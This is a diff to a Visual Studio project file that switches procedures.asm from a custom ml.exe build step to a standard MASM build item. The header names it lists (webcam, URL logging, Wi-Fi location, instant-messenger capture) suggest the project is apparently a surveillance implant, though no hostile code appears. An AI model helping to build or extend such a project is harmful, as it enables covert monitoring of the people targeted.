@@ -204,13 +204,6 @@
     <None Include="H4-DLL.def" />
   </ItemGroup>
   <ItemGroup>
-    <CustomBuild Include="procedures.asm">
-      <Command Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">ml.exe /c /nologo /Zi /Fo"Release\procedures.obj" /W3 /errorReport:prompt  /Taprocedures.asm</Command>
-      <FileType>Document</FileType>
-      <Outputs Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Release\procedures.obj;%(Outputs)</Outputs>
-    </CustomBuild>
-  </ItemGroup>
-  <ItemGroup>
     <ClInclude Include="aes_alg.h" />
     <ClInclude Include="IMAgent\QMsnLive2011.h" />
     <ClInclude Include="HM_Money.h" />
@@ -305,6 +298,9 @@
     <ClInclude Include="HM_UrlLog.h" />
     <ClInclude Include="HM_WebCam.h" />
     <ClInclude Include="HM_WiFiLocation.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="procedures.asm" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
